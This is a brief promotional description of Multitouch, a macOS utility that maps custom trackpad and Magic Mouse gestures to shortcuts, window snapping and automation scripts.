## ❓ What is Multitouch for Mac?

Multitouch is a powerful macOS utility that expands how you use your Mac's input devices. It lets you create custom multitouch gestures for your trackpad, Magic Mouse, or Magic Trackpad, allowing you to assign keyboard shortcuts, window snapping, or automation scripts to taps, swipes, pinches, and force clicks.

Perfect for power users and professionals, Multitouch enables you to replace complex workflows with intuitive gestures, saving time and improving comfort. Whether you're browsing, coding, or designing, the app integrates smoothly with the system, stays light on resources, and works flawlessly on both Intel and Apple Silicon Macs.

With full support for gesture mapping, per-app customization, and deep macOS integration, Multitouch becomes a must-have tool for those who demand control, speed, and elegance in their workflow.
